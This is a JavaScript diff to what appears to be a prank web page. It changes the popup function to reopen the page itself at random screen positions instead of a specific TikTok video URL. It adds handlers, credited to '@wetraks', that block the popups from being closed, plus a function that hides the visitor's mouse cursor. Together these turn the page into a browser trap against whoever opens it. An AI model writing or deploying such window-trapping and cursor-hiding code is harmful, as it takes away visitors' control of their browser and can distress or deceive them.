@@ -604,22 +604,42 @@ function focusWindows () {
  * Open a new popup window. Requires user-initiated event.
  */
 function openWindow () {
-  const targetUrl = 'https://www.tiktok.com/@_elenadildo/video/7599405133612600607?is_from_webapp=1&sender_device=pc&web_id=7625007267123283459';
+  const { x, y } = getRandomCoords()
+  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
+  const win = window.open(window.location.pathname, '', opts)
 
-  for (let i = 0; i < 1; i++) {
-    const { x, y } = getRandomCoords()
-    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
-    
-    // Otwieranie konkretnego linku zamiast ścieżki bieżącej strony
-    const win = window.open(targetUrl, '', opts)
+  // New windows may be blocked by the popup blocker
+  if (!win) return
+  wins.push(win)
 
-    // New windows may be blocked by the popup blocker
-    if (!win) continue
-    wins.push(win)
+  if (wins.length === 2) setupSearchWindow(win)
 
-    if (wins.length === 2) setupSearchWindow(win)
-  }
+  // Added by @wetraks
+  win.onunload = function () {
+    // Some browsers might not support onunload, but include it for completeness
+    return false;
+  };
+
+  // For modern browsers
+  win.addEventListener("beforeunload", function (e) {
+    e.preventDefault();
+    e.returnValue = "";
+  });
+
+  // For older browsers
+  win.onbeforeunload = function () {
+    return "";
+  };
+  // Added by @wetraks
 }
+
+/**
+ * Hide the user's cursor!
+ */
+function hideCursor () {
+  document.querySelector('html').style = 'cursor: none;'
+}
+
 /**
  * Trigger a file download immediately. One file download is allowed *without* user
  * interaction. Further file downloads should happen in response to a user-initiated
